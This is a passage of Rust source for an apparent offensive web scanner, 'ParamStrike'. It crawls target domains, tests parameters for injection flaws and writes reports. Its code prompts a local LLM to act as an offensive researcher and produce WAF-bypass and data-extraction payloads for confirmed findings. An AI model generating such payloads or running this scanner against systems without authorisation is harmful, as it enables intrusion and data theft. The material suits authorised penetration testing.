    let client = Client::builder().timeout(Duration::from_secs(300)).build()
        .map_err(|e| std::io::Error::new(std::io::ErrorKind::Other, e.to_string()))?;
    let ep = format!("{}/v1/chat/completions", host.trim_end_matches('/'));

    for a in achados.iter_mut() {
        let prompt = format!(
            "Pesquisador de segurança ofensiva. Dado este achado confirmado:\n\
Tipo:{} URL:{} Param:{} Payload:{}\nResposta:{}\n\n\
Gere 5 payloads para: bypass WAF, extração de dados, escalada de impacto.\n\
Responda SOMENTE com JSON array de strings.",
            a.tipo, a.url, a.parametro, a.payload,
            &a.corpo_preview[..a.corpo_preview.len().min(800)]
        );
        let body = serde_json::json!({"model":modelo,"messages":[{"role":"user","content":prompt}],"temperature":0.4,"max_tokens":300});
        match client.post(&ep).json(&body).send() {
            Ok(r) if r.status().is_success() => {
                if let Ok(json) = r.json::<Value>() {
                    let texto = json.pointer("/choices/0/message/content")
                        .and_then(|v| v.as_str()).unwrap_or("").trim().to_string();
                    if verbose { println!("{}[LLM] {}{}", CYAN, texto, RESET); }
                    let s = if let (Some(i), Some(e)) = (texto.find('['), texto.rfind(']')) { &texto[i..=e] } else { "[]" };
                    if let Ok(Value::Array(arr)) = serde_json::from_str::<Value>(s) {
                        let extras: Vec<String> = arr.iter().filter_map(|v| v.as_str().map(|s| s.to_string())).collect();
                        if !extras.is_empty() {
                            println!("{}[LLM] {} payloads gerados para {}:{}", MAGENTA, extras.len(), a.tipo, RESET);
                            for p in &extras { println!("{}  → {}{}", MAGENTA, p, RESET); }
                            a.llm = Some(format!("extras: {}", extras.join(" | ")));
                        }
                    }
                }
            }
            Err(e) if e.is_connect() => { eprintln!("{}[LLM] Servidor offline em {}.{}", YELLOW, host, RESET); break; }
            _ => {}
        }
    }
    Ok(())
}

// ─── LLM: validar achados ─────────────────────────────────────────────────────

fn validar_com_unsloth(modelo: &str, host: &str, achados: &mut [Achado], verbose: bool) -> std::io::Result<()> {
    println!("{}[LLM] Validando {} achados ({} @ {})...{}", CYAN, achados.len(), modelo, host, RESET);
    let client = Client::builder().timeout(Duration::from_secs(300)).build()
        .map_err(|e| std::io::Error::new(std::io::ErrorKind::Other, e.to_string()))?;
    let ep = format!("{}/v1/chat/completions", host.trim_end_matches('/'));
    let sistema = "Especialista em pentest/bug bounty. Classifique achados de vulnerabilidades web. Seja técnico, objetivo. Responda em português.";

    for a in achados.iter_mut() {
        let usuario = format!(
            "Classifique:\nTIPO:{} SEVERIDADE:{} URL:{} Param:{} Payload:{} HTTP:{} {}ms\nResposta:\n---\n{}\n---\n\n\
CLASSIFICAÇÃO: true_positive | false_positive\nSEVERIDADE_REAL: critica|alta|media|baixa\nJUSTIFICATIVA: <2 frases>\nPAYLOADS_EXTRAS: <JSON array ou []>",
            a.tipo, a.severidade.label(), a.url, a.parametro, a.payload,
            a.status_code, a.tempo_ms, &a.corpo_preview[..a.corpo_preview.len().min(3000)]
        );
        let body = serde_json::json!({"model":modelo,"messages":[{"role":"system","content":sistema},{"role":"user","content":usuario}],"temperature":0.1,"max_tokens":512});
        match client.post(&ep).json(&body).send() {
            Ok(r) if r.status().is_success() => {
                if let Ok(json) = r.json::<Value>() {
                    let texto = json.pointer("/choices/0/message/content")
                        .and_then(|v| v.as_str()).unwrap_or("").trim().to_string();
                    if verbose { println!("{}[LLM]\n{}{}", CYAN, texto, RESET); }
                    let cl = if texto.to_lowercase().contains("true_positive") {
                        format!("{}TRUE POSITIVE{}", RED, RESET)
                    } else if texto.to_lowercase().contains("false_positive") {
                        format!("{}false_positive{}", DIM, RESET)
                    } else { format!("{}indefinido{}", YELLOW, RESET) };
                    println!("{}[LLM]{} {} → {} | {}", CYAN, RESET, a.tipo, cl, a.url);
                    if let Some(i) = texto.find("PAYLOADS_EXTRAS:") {
                        let t = texto[i+"PAYLOADS_EXTRAS:".len()..].trim();
                        let s = if let (Some(si), Some(ei)) = (t.find('['), t.rfind(']')) { &t[si..=ei] } else { "[]" };
                        if let Ok(Value::Array(arr)) = serde_json::from_str::<Value>(s) {
                            let extras: Vec<String> = arr.iter().filter_map(|v| v.as_str().map(|s| s.to_string())).collect();
                            if !extras.is_empty() {
                                for p in &extras { println!("{}  [LLM] → {}{}", MAGENTA, p, RESET); }
                            }
                        }
                    }
                    a.llm = Some(texto.lines().take(3).collect::<Vec<_>>().join(" "));
                }
            }
            Ok(r)  => eprintln!("{}[LLM] HTTP {}{}", YELLOW, r.status(), RESET),
            Err(e) if e.is_timeout()  => eprintln!("{}[LLM] Timeout para {}. Pulando.{}", YELLOW, a.url, RESET),
            Err(e) if e.is_connect()  => {
                eprintln!("{}[LLM] Servidor offline em {}. Inicie o llama-server.{}", YELLOW, host, RESET);
                break;
            }
            Err(e) => eprintln!("{}[LLM] {}{}", YELLOW, e, RESET),
        }
    }
    Ok(())
}

// ─── Relatórios ───────────────────────────────────────────────────────────────

fn salvar_relatorios(prefix: &str, achados: &[Achado], falhas: &[(String,String,String,String)]) -> std::io::Result<()> {
    let pa = format!("{}_achados.csv", prefix);
    let mut f = File::create(&pa)?;
    writeln!(f, "severidade,tipo,url,parametro,payload,status,tempo_ms,llm")?;
    for a in achados {
        writeln!(f, "\"{}\",\"{}\",\"{}\",\"{}\",\"{}\",{},{},\"{}\"",
            a.severidade.label(), a.tipo,
            escape_csv(&a.url), escape_csv(&a.parametro), escape_csv(&a.payload),
            a.status_code, a.tempo_ms, escape_csv(a.llm.as_deref().unwrap_or("")))?;
    }
    let pf = format!("{}_falhas.csv", prefix);
    let mut f2 = File::create(&pf)?;
    writeln!(f2, "url,parametro,payload,erro")?;
    for (u,p,pay,err) in falhas {
        writeln!(f2, "\"{}\",\"{}\",\"{}\",\"{}\"", escape_csv(u), escape_csv(p), escape_csv(pay), escape_csv(err))?;
    }
    println!("{}[✔] CSV: {} | {}{}", GREEN, pa, pf, RESET);
    Ok(())
}

fn salvar_relatorio_html(prefix: &str, achados: &[Achado]) -> std::io::Result<()> {
    let path = format!("{}_report.html", prefix);
    let mut f = File::create(&path)?;
    writeln!(f, r#"<!DOCTYPE html><html lang="pt-BR"><head><meta charset="UTF-8">
<title>ParamStrike Report</title>
<style>
body{{font-family:monospace;background:#0d1117;color:#c9d1d9;padding:2rem}}
h1{{color:#58a6ff}}h2{{color:#79c0ff;border-bottom:1px solid #30363d;padding-bottom:.5rem}}
table{{width:100%;border-collapse:collapse;margin-bottom:2rem}}
th{{background:#161b22;color:#58a6ff;padding:.5rem;text-align:left}}
td{{padding:.4rem .5rem;border-bottom:1px solid #21262d;font-size:.85rem;word-break:break-all}}
tr:hover td{{background:#161b22}}
.CRITICA{{color:#ff6b6b}}.ALTA{{color:#ffa94d}}.MEDIA{{color:#da77f2}}.BAIXA{{color:#74c0fc}}
</style></head><body>
<h1>&#x1F3AF; ParamStrike Vulnerability Report</h1>
<p style="color:#8b949e">Total de achados: {}</p>
<h2>Achados</h2>
<table><tr><th>Sev</th><th>Tipo</th><th>URL</th><th>Parâmetro</th><th>Payload</th><th>HTTP</th><th>ms</th><th>LLM</th></tr>"#,
    achados.len())?;
    for a in achados {
        writeln!(f, "<tr><td class=\"{}\"><b>{}</b></td><td>{}</td><td>{}</td><td>{}</td><td><code>{}</code></td><td>{}</td><td>{}</td><td>{}</td></tr>",
            a.severidade.label(), a.severidade.label(), a.tipo,
            html_esc(&a.url), html_esc(&a.parametro), html_esc(&a.payload),
            a.status_code, a.tempo_ms, html_esc(a.llm.as_deref().unwrap_or("-")))?;
    }
    writeln!(f, "</table></body></html>")?;
    println!("{}[✔] HTML: {}{}", GREEN, path, RESET);
    Ok(())
}

fn escape_csv(s: &str) -> String { s.replace('"',"\"\"") }
fn html_esc(s: &str)   -> String { s.replace('&',"&amp;").replace('<',"&lt;").replace('>',"&gt;").replace('"',"&quot;") }

// ─── anew ─────────────────────────────────────────────────────────────────────

fn salvar_com_anew(arquivo: &str, urls: &[String]) -> std::io::Result<()> {
    let mut child = Command::new("anew").arg(arquivo)
        .stdin(Stdio::piped()).stdout(Stdio::null()).spawn()?;
    if let Some(mut stdin) = child.stdin.take() {
        for url in urls { writeln!(stdin, "{}", url)?; }
    }
    child.wait()?;
    Ok(())
}

fn obter_nome_arquivo_status(status: u16, base: &str) -> String {
    let cat = match status { 200..=299=>"2xx",300..=399=>"3xx",400..=499=>"4xx",500..=599=>"5xx",_=>"xxx" };
    format!("{}_{}.txt", base.strip_suffix(".txt").unwrap_or(base), cat)
}

// ─── Pinchtab ─────────────────────────────────────────────────────────────────

fn coletar_urls_pinchtab(host: &str, start: &str, verbose: bool) -> std::io::Result<Vec<String>> {
    let client = Client::builder().timeout(Duration::from_secs(15)).build()
        .map_err(|e| std::io::Error::new(std::io::ErrorKind::Other, e.to_string()))?;
    if verbose { println!("{}[PT] {}{}", CYAN, start, RESET); }
    let tab: Value = client.post(format!("{}/tab", host))
        .json(&serde_json::json!({"action":"new","url":start}))
        .send().and_then(|r| r.json())
        .map_err(|e| std::io::Error::new(std::io::ErrorKind::Other, e.to_string()))?;
    let tid = tab.get("tabId").and_then(|v| v.as_str())
        .ok_or_else(|| std::io::Error::new(std::io::ErrorKind::Other,"sem tabId"))?.to_string();
    let snap: Value = client.get(format!("{}/snapshot", host))
        .query(&[("tabId",tid.as_str()),("filter","interactive")])
        .send().and_then(|r| r.json())
        .map_err(|e| std::io::Error::new(std::io::ErrorKind::Other, e.to_string()))?;
    let mut urls = Vec::new();
    coletar_links_json(&snap, &mut urls);
    let mut seen = HashSet::new();
    urls.retain(|u| seen.insert(u.clone()) && u.contains('?'));
    if verbose { println!("{}[PT] {} URLs{}", MAGENTA, urls.len(), RESET); }
    Ok(urls)
}

fn coletar_links_json(v: &Value, out: &mut Vec<String>) {
    match v {
        Value::Array(a)  => a.iter().for_each(|i| coletar_links_json(i, out)),
        Value::Object(m) => {
            m.values().for_each(|val| coletar_links_json(val, out));
            if let Some(h) = m.get("href").and_then(|x| x.as_str()) { out.push(h.to_string()); }
            if let Some(u) = m.get("url").and_then(|x| x.as_str())  { out.push(u.to_string()); }
        }
        Value::String(s) if s.starts_with("http") => out.push(s.clone()),
        _ => {}
    }
}

// ─── Ferramentas externas ─────────────────────────────────────────────────────

fn executar_subfinder(domain: &str, saida: &str) -> std::io::Result<()> {
    println!("{}[*] subfinder: {}{}", MAGENTA, domain, RESET);
    let o = Command::new("subfinder").args(["-d",domain,"-all"]).output()?;
    if !o.status.success() { return Err(std::io::Error::new(std::io::ErrorKind::Other,"subfinder falhou")); }
    File::create(saida)?.write_all(&o.stdout)?;
    println!("{}[+] {} subdomínios{}", GREEN, String::from_utf8_lossy(&o.stdout).lines().count(), RESET);
    Ok(())
}

fn executar_katana(subs: &str, urls: &str) -> std::io::Result<()> {
    println!("{}[*] katana crawling...{}", MAGENTA, RESET);
    let o = Command::new("katana").args(["-list",subs,"-jc","-kf","all"]).output()?;
    if !o.status.success() { eprintln!("{}[!] katana falhou{}", YELLOW, RESET); }
    File::create(urls)?.write_all(&o.stdout)?;
    println!("{}[+] {} URLs (katana){}", GREEN, String::from_utf8_lossy(&o.stdout).lines().count(), RESET);
    Ok(())
}

fn executar_urlfinder(subs: &str, urls: &str) -> std::io::Result<()> {
    println!("{}[*] urlfinder...{}", MAGENTA, RESET);
    let o = Command::new("urlfinder").args(["-i",subs]).output()?;
    if !o.status.success() { eprintln!("{}[!] urlfinder falhou{}", YELLOW, RESET); }
    std::fs::OpenOptions::new().create(true).append(true).open(urls)?.write_all(&o.stdout)?;
    println!("{}[+] {} URLs (urlfinder){}", GREEN, String::from_utf8_lossy(&o.stdout).lines().count(), RESET);
    Ok(())
}

// ─── Modos ────────────────────────────────────────────────────────────────────

fn processar_domain_unico(domain: &str, saida: Option<String>, cfg: &Config, pt: Option<PinchTabConfig>) {
    println!("{}[*] Domínio: {}{}\n", CYAN, domain, RESET);
    let subs = "dominios_temp.txt";
    let urls = "urls_temp.txt";
    let out  = saida.unwrap_or_else(|| format!("{}_urls_filtradas.txt", domain));
    if let Err(e) = executar_subfinder(domain, subs) { eprintln!("{}[✗] {}{}", RED, e, RESET); process::exit(1); }
    let _ = executar_katana(subs, urls);
    let _ = executar_urlfinder(subs, urls);
    println!("\n{}[*] Filtrando...{}\n", BLUE, RESET);
    if let Err(e) = filtrar_urls(urls, &out, cfg, pt) { eprintln!("{}[✗] {}{}", RED, e, RESET); process::exit(1); }
    let _ = std::fs::remove_file(subs);
    let _ = std::fs::remove_file(urls);
    println!("{}[✔] Resultado: {}{}", GREEN, out, RESET);
}

fn processar_lista_dominios(arquivo: &str, saida: Option<String>, cfg: &Config, pt: Option<PinchTabConfig>) {
    if !PathBuf::from(arquivo).exists() { eprintln!("{}[✗] {}{}", RED, arquivo, RESET); process::exit(1); }
    println!("{}[*] Lista: {}{}\n", CYAN, arquivo, RESET);
    let urls = "urls_crawled.txt";
    let out  = saida.unwrap_or_else(|| "urls_filtradas_lote.txt".to_string());
    if let Ok(f) = File::open(arquivo) { println!("{}[+] {} subs{}", GREEN, BufReader::new(f).lines().count(), RESET); }
    let _ = executar_katana(arquivo, urls);
    let _ = executar_urlfinder(arquivo, urls);
    println!("\n{}[*] Filtrando...{}\n", BLUE, RESET);
    if let Err(e) = filtrar_urls(urls, &out, cfg, pt) { eprintln!("{}[✗] {}{}", RED, e, RESET); process::exit(1); }
    let _ = std::fs::remove_file(urls);
    println!("{}[✔] Resultado: {}{}", GREEN, out, RESET);
}

fn processar_argumentos() -> (String, String) {
    let args: Vec<String> = env::args().collect();
    let cwd = env::current_dir().map(|p| p.to_string_lossy().into_owned()).unwrap_or_else(|_| ".".to_string());
    let entrada = if let Some(pos) = args.iter().position(|x| x == "-l") {
        if pos + 1 < args.len() {
            let p = PathBuf::from(&args[pos+1]);
            let abs = if p.is_absolute() { p } else { PathBuf::from(&cwd).join(&args[pos+1]) };
            if !abs.exists() { eprintln!("{}[✗] {}{}", RED, abs.display(), RESET); process::exit(1); }
            abs.to_string_lossy().into_owned()
        } else { eprintln!("{}[✗] Sem arquivo após -l.{}", RED, RESET); process::exit(1); }
    } else { eprintln!("{}[✗] Use -l <arquivo> ou -h para ajuda.{}", RED, RESET); process::exit(1); };
    let saida = arg_val(&args, "-o").unwrap_or_else(|| "urls_parametros.txt".to_string());
    (entrada, saida)
}

// ─── Banner & Help ────────────────────────────────────────────────────────────

fn mostrar_banner() {
    println!("{}", RED);
    println!(" ______    ______     ______     ______     __    __     ______     ______   ______     __     __  __     ______");
    println!("/\\  == \\  /\\  __ \\   /\\  == \\   /\\  __ \\   /\\ \"-./  \\   /\\  ___\\   /\\__  _\\ /\\  == \\   /\\ \\   /\\ \\/ /    /\\  ___\\");
    println!("\\ \\  _-/  \\ \\  __ \\  \\ \\  __<   \\ \\  __ \\  \\ \\ \\-./\\ \\  \\ \\___  \\  \\/_/\\ \\/ \\ \\  __<   \\ \\ \\  \\ \\  _\"-. \\ \\  __\\");
    println!(" \\ \\_\\     \\ \\_\\ \\_\\  \\ \\_\\ \\_\\  \\ \\_\\ \\_\\  \\ \\_\\ \\ \\_\\  \\/\\_____\\    \\ \\_\\  \\ \\_\\ \\_\\  \\ \\_\\  \\ \\_\\ \\_\\  \\ \\_____\\");
    println!("  \\/_/      \\/_/\\/_/   \\/_/ /_/   \\/_/\\/_/   \\/_/  \\/_/   \\/_____/     \\/_/   \\/_/ /_/   \\/_/   \\/_/\\/_/   \\/_____/");
    println!("{}", RESET);
    println!("{}  v{} — URL Recon & Active Vulnerability Scanner{}", BOLD, VERSION, RESET);
    println!("{}  SQLi · XSS · SSRF · LFI · RCE · IDOR · OpenRedirect · SSTI · WAF Detection{}", DIM, RESET);
    println!();
    println!("{}═══════════════════════════════════════════════════════════════════{}", BLUE, RESET);
    println!("{}  ✔ Developed by: 0x13-ByteZer0  │  AI: Unsloth/llama-server{}", GREEN, RESET);
    println!("{}═══════════════════════════════════════════════════════════════════{}", BLUE, RESET);
    println!();
}

fn mostrar_help() {
    println!("{}Uso:{} paramstrike [OPÇÕES]\n", BOLD, RESET);

    println!("{}── Entrada ──────────────────────────────────────────────────────{}", DIM, RESET);
    println!("  {}  -l <arquivo>{}           URLs de entrada", YELLOW, RESET);
    println!("  {}  -d <domínio>{}           Subfinder → Katana → explorar", CYAN, RESET);
    println!("  {}  -f <arquivo>{}           Lista de subdomínios para crawl", CYAN, RESET);
    println!("  {}  -o <arquivo>{}           Arquivo de saída", YELLOW, RESET);

    println!("\n{}── Opções ───────────────────────────────────────────────────────{}", DIM, RESET);
    println!("  {}  -v, --verbose{}          Modo verbose", MAGENTA, RESET);
    println!("  {}  -status{}                Checar HTTP status", MAGENTA, RESET);
    println!("  {}  --waf{}                  Detectar WAF", MAGENTA, RESET);
    println!("  {}  --only-sensitive{}       Testar só parâmetros sensíveis (id,url,cmd...)", MAGENTA, RESET);
    println!("  {}  --timeout <s>{}          Timeout por requisição (padrão: 10)", MAGENTA, RESET);
    println!("  {}  --threads <n>{}          Threads paralelas (padrão: auto)", MAGENTA, RESET);
    println!("  {}  --delay <ms>{}           Delay entre requisições", MAGENTA, RESET);
    println!("  {}  --cookie <val>{}         Cookie de sessão", MAGENTA, RESET);
    println!("  {}  --header <N: V>{}        Header extra (repetível)", MAGENTA, RESET);

    println!("\n{}── Exploração ───────────────────────────────────────────────────{}", DIM, RESET);
    println!("  {}  -p, --explore{}          SQLi XSS SSRF LFI RCE IDOR OpenRedirect SSTI", MAGENTA, RESET);

    println!("\n{}── IA (Unsloth/llama-server) ────────────────────────────────────{}", DIM, RESET);
    println!("  {}  --unsloth{}              Validar achados com LLM", MAGENTA, RESET);
    println!("  {}  --llm-payloads{}         Gerar payloads customizados via LLM", MAGENTA, RESET);
    println!("  {}  --unsloth-model <m>{}    Modelo (padrão: {})", MAGENTA, RESET, UNSLOTH_MODEL_DEFAULT);
    println!("  {}  --unsloth-host <url>{}   Host llama-server (padrão: {})", MAGENTA, RESET, UNSLOTH_HOST_DEFAULT);

    println!("\n{}── Relatório ────────────────────────────────────────────────────{}", DIM, RESET);
    println!("  {}  --report-prefix <p>{}    Gerar CSV + HTML report", MAGENTA, RESET);

    println!("\n{}── Outros ───────────────────────────────────────────────────────{}", DIM, RESET);
    println!("  {}  -up, --update{}          Git pull + recompilar", MAGENTA, RESET);
    println!("  {}  -h, --help{}             Esta ajuda\n", YELLOW, RESET);

    println!("{}Exemplos:{}", BOLD, RESET);
    println!("  {}$ paramstrike -l urls.txt -p --waf --only-sensitive{}", GREEN, RESET);
    println!("  {}$ paramstrike -d alvo.com -p --unsloth --llm-payloads --report-prefix r1{}", GREEN, RESET);
    println!("  {}$ paramstrike -d alvo.com -p --cookie \"PHPSESSID=abc\" --delay 300{}", GREEN, RESET);
    println!("  {}$ paramstrike -l urls.txt -p --threads 30 --timeout 5 --report-prefix scan{}\n", GREEN, RESET);
}

// ─── Verificação de atualizações ──────────────────────────────────────────────

fn verificar_atualizacoes() {
    let client = match Client::builder().timeout(Duration::from_secs(5)).build() { Ok(c)=>c, Err(_)=>return };
    let tag: Option<String> = client
        .get("https://api.github.com/repos/0x13-ByteZer0/paramstrike/releases/latest")
        .header(USER_AGENT, format!("paramstrike/{}", VERSION))
        .send().ok()
        .and_then(|r| {
            let ok = r.status().is_success();
            r.json::<Value>().ok().and_then(|j| {
                if ok { j.get("tag_name").and_then(|v| v.as_str()).map(|t| t.trim_start_matches('v').to_string()) }
                else { None }
            })
        });
    match tag {
        Some(ref r) if r.as_str() != VERSION => {
            println!("{}[!] Atualização disponível: v{} → v{}  |  $ paramstrike -up{}", YELLOW, VERSION, r, RESET);
        }
        Some(_) => println!("{}[✔] v{} — atualizado{}", GREEN, VERSION, RESET),
        None    => println!("{}[✔] v{}{}", GREEN, VERSION, RESET),
    }
    println!();
}

// ─── Atualização ─────────────────────────────────────────────────────────────

fn atualizar_ferramenta() {
    println!("{}[*] Atualizando...{}", BLUE, RESET);
    let dir = env::current_exe().ok()
        .and_then(|p| p.ancestors().nth(3).map(|a| a.to_path_buf()))
        .filter(|d| d.join("Cargo.toml").exists());

    let mut git = Command::new("git"); git.arg("pull");
    if let Some(ref d) = dir { git.current_dir(d); }
    match git.output() {
        Ok(o) if o.status.success() => println!("{}[+] git pull OK{}", GREEN, RESET),
        Ok(o)  => { eprintln!("{}{}{}", RED, String::from_utf8_lossy(&o.stderr), RESET); process::exit(1); }
        Err(e) => { eprintln!("{}git: {}{}", RED, e, RESET); process::exit(1); }
    }

    let mut cargo = Command::new("cargo"); cargo.args(["build","--release"]);
    if let Some(ref d) = dir { cargo.current_dir(d); }
    match cargo.output() {
        Ok(o) if o.status.success() => println!("{}[✔] Compilado! Binário atualizado.{}", GREEN, RESET),
        Ok(o)  => { eprintln!("{}{}{}", RED, String::from_utf8_lossy(&o.stderr), RESET); process::exit(1); }
        Err(e) => { eprintln!("{}cargo: {}{}", RED, e, RESET); process::exit(1); }
    }
}